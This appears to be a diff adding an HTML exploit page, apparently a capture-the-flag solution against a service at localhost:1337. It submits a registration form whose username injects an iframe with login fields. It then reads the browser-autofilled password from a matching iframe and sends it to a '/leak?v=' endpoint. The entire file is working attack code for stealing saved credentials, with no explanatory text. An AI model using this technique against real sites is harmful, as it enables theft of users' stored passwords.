@@ -1,0 +1,24 @@
+<form method="post" action="http://localhost:1337/" target="lol">
+    <input name="username"><br>
+    <input name="password" type="password"><br>
+    <button type="submit">Register</button>
+</form>
+<iframe id="iframe"></iframe>
+<script>
+    const sleep = s => new Promise(r => setTimeout(r, s));
+    (async() => {
+        const w = open("about:blank", "lol");
+        const form = document.forms[0];
+        form.username.value = "<iframe srcdoc='&lt;input name&equals;&quot;username&quot;&gt;&lt;input type&equals;&quot;password&quot;&gt;'></iframe>" + Math.random();
+        form.password.value = "xxx";
+        form.submit();
+
+        await sleep(500);
+
+        const iframe = document.querySelector("#iframe");
+        iframe.srcdoc = '<input name="username"><input type="password">';
+
+        await sleep(500);
+        document.location.assign("/leak?v=" + iframe.contentDocument.querySelector("input[type=password]").value)
+    })();
+</script>
